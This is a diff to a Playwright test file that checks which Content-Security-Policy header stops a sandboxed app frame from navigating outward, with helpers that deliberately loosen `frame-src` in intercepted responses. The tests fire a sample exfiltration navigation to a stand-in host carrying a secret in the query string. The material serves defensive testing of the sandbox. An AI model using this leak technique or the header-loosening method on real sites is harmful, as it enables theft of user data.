@@ -1,4 +1,4 @@
-import { expect, test, type Frame, type FrameLocator, type Page } from '@playwright/test'
+import { expect, test, type BrowserContext, type Frame, type FrameLocator, type Page } from '@playwright/test'
 import { fixtureViewHtml, startFixtureHost, type FixtureHost } from './fixtures/app-views.js'
 
 /**
@@ -345,10 +345,14 @@ test('S-2 (browser part): an app frame cannot reach the parent, the top window, 
   expect(page.url()).toBe(topUrl)
 
   /*
-   * A way to leak a value by navigating its own frame outward — the proxy's frame-src blocks this.
-   * Waiting a fixed time and then finding nothing proves nothing on a loaded machine (the request
-   * may simply not have gone out yet, #845), so the test waits for one of the two outcomes to be
-   * seen: the proxy reports the frame-src violation, or the request reaches the route.
+   * A way to leak a value by navigating its own frame outward. A frame's navigation is checked
+   * against the `frame-src` of the document that embeds it, here the proxy page, whose header in
+   * this opaque mode is the view's own policy (`buildViewCsp`: `frame-src 'none'` unless declared).
+   * "which CSP stops a frame navigating itself outward" below loosens each header in turn and
+   * covers the per-app origin mode too. Waiting a fixed time and then finding nothing proves
+   * nothing on a loaded machine (the request may simply not have gone out yet, #845), so the test
+   * waits for one of the two outcomes to be seen: the proxy page reports the frame-src violation,
+   * or the request reaches the route.
    */
   const proxy = inner.parentFrame()!
   await proxy.evaluate(() => {
@@ -363,6 +367,101 @@ test('S-2 (browser part): an app frame cannot reach the parent, the top window, 
   await expect.poll(async () => leaked.length + (await violations()).length, { timeout: 15_000 }).toBeGreaterThan(0)
   expect(leaked).toEqual([])
   expect(await violations()).toEqual([{ directive: 'frame-src', blocked: expect.stringMatching(/^https:\/\/example\.test/) }])
+})
+
+/**
+ * Rewrites the `frame-src` of the CSP header on one of the two pages a view is loaded from, in the real
+ * responses of the real host, so a test can see which of them the browser enforces. Returns how many headers it
+ * rewrote, so a test that expects "no change" can first show something was loosened.
+ *   proxy-page     the page on the host port that embeds the view (header: `buildViewCsp` in opaque mode,
+ *                  `buildProxyCsp` in per-app origin mode)
+ *   view-document  the view's own document, served from its per-app origin port (header: `buildViewCsp`)
+ */
+async function loosenFrameSrc(context: BrowserContext, which: 'proxy-page' | 'view-document'): Promise<{ rewritten: number; unchanged: number }> {
+  const count = { rewritten: 0, unchanged: 0 }
+  await context.route(/^http:\/\/127\.0\.0\.1:\d+\/.*\/views\//, async (route) => {
+    const url = new URL(route.request().url())
+    const response = await route.fetch()
+    const csp = response.headers()['content-security-policy']
+    const isProxyPage = Number(url.port) === fx.port
+    if (!csp || isProxyPage !== (which === 'proxy-page')) return route.fulfill({ response })
+    const loosened = csp.replace(/frame-src ([^;]*)/, (_, value: string) => ['frame-src', value.replace("'none'", '').trim(), 'https://example.test'].filter(Boolean).join(' '))
+    // A header with no frame-src to loosen is counted, not asserted here: a throw in a route handler would only hang the load
+    if (loosened === csp) count.unchanged++
+    else count.rewritten++
+    return route.fulfill({ response, headers: { ...response.headers(), 'content-security-policy': loosened } })
+  })
+  return count
+}
+
+/**
+ * The view navigates its own frame to an outside address with a secret in it. Resolves with what reached the
+ * network and what the proxy page reported, once the awaited one has happened (a fixed wait proves nothing under
+ * load, #845): the request when `expectLeak`, else the request or the violation report.
+ */
+async function navigateOutward(page: Page, context: BrowserContext, app: { appId: string; projectId: string | null }, expectLeak = false) {
+  const leaked: string[] = []
+  await context.route('https://example.test/**', (r) => {
+    leaked.push(r.request().url())
+    return r.fulfill({ body: 'leak' })
+  })
+  const id = fx.open(app, `ui://${app.appId}/main`)
+  await mount(page, 'a', { ...app, instanceId: id })
+  const inner = await innerFrame(page, 'a')
+  const proxy = inner.parentFrame()!
+  await proxy.evaluate(() => {
+    const w = window as any
+    w.__violations = []
+    document.addEventListener('securitypolicyviolation', (e) => w.__violations.push({ directive: e.effectiveDirective, blocked: e.blockedURI }))
+  })
+  await inner.evaluate(() => {
+    location.href = 'https://example.test/leak?secret=1'
+  }).catch(() => {})
+  const violations = () => proxy.evaluate(() => (window as any).__violations as { directive: string; blocked: string }[])
+  // Wait for the event the case is about: the request when the navigation is expected to get out, else the report
+  await expect.poll(async () => (expectLeak ? leaked.length : leaked.length + (await violations().catch(() => [])).length), { timeout: 15_000 }).toBeGreaterThan(0)
+  return { leaked, violations: await violations().catch(() => []) }
+}
+
+const BLOCKED = [{ directive: 'frame-src', blocked: expect.stringMatching(/^https:\/\/example\.test/) }]
+
+/*
+ * Which CSP stops a frame navigating itself outward (#1332). A frame's navigation is checked against the
+ * `frame-src` of the document that EMBEDS it, never against the frame's own document: the view's own
+ * `frame-src` governs only the frames the view creates. So the header that matters is the proxy page's, and what
+ * that header is depends on the origin mode. Each case loosens one header in the real response and looks at the
+ * network. (The opaque mode's unloosened case is the end of S-2 above: blocked, with the frame-src report.)
+ */
+test.describe('which CSP stops a frame navigating itself outward', () => {
+  test('opaque origin: the proxy page carries the view CSP (buildViewCsp); with its frame-src loosened the navigation goes out', async ({ page, context }) => {
+    const rewrites = await loosenFrameSrc(context, 'proxy-page')
+    const { leaked } = await navigateOutward(page, context, { projectId: null, appId: 'fixture' }, true)
+    expect(leaked).toEqual(['https://example.test/leak?secret=1'])
+    expect(rewrites.rewritten).toBeGreaterThan(0)
+  })
+
+  test('per-app origin: the navigation is stopped', async ({ page, context }) => {
+    const { leaked, violations } = await navigateOutward(page, context, { projectId: 'p1', appId: 'fixture-port' })
+    expect(leaked).toEqual([])
+    expect(violations).toEqual(BLOCKED)
+  })
+
+  test('per-app origin: loosening the proxy page (buildProxyCsp) lets it out', async ({ page, context }) => {
+    const rewrites = await loosenFrameSrc(context, 'proxy-page')
+    const { leaked } = await navigateOutward(page, context, { projectId: 'p1', appId: 'fixture-port' }, true)
+    expect(leaked).toEqual(['https://example.test/leak?secret=1'])
+    expect(rewrites.rewritten).toBeGreaterThan(0)
+  })
+
+  test("per-app origin: loosening the view's own document CSP (buildViewCsp) changes nothing", async ({ page, context }) => {
+    const rewrites = await loosenFrameSrc(context, 'view-document')
+    const { leaked, violations } = await navigateOutward(page, context, { projectId: 'p1', appId: 'fixture-port' })
+    expect(leaked).toEqual([])
+    expect(violations).toEqual(BLOCKED)
+    // The header was rewritten (so "nothing changed" is a result, not an untouched policy), and no header lacked a frame-src
+    expect(rewrites.rewritten).toBeGreaterThan(0)
+    expect(rewrites.unchanged).toBe(0)
+  })
 })
 
 test('per-app origin mode: gets a real origin on its own port, storage is separated per app, and reopening gets the same origin', async ({ page }) => {
